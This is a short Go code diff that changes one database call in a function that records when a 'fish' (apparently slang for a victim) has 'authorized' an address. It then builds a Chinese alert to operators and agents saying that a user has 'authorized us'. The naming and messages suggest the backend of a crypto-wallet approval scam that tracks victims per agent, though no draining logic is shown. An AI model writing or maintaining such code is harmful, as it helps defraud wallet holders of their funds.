@@ -373,7 +373,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 					fishID := strconv.Itoa(int(fish.ID))
 					admin := Admin{}
 					Db.Where("id=?", fish.AdminId).First(&admin)
-					Db.Where("id=?", fish.AdminId).Update(&Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
+					Db.Model(&Fish{}).Where("id=?", fish.AdminId).Update(&Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
 					content := "❥【授权给我们报警!!】---------------------------------------------------->%0A" +
 						" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
 						"所属代理ID:" + admin.Username + "%0A" +
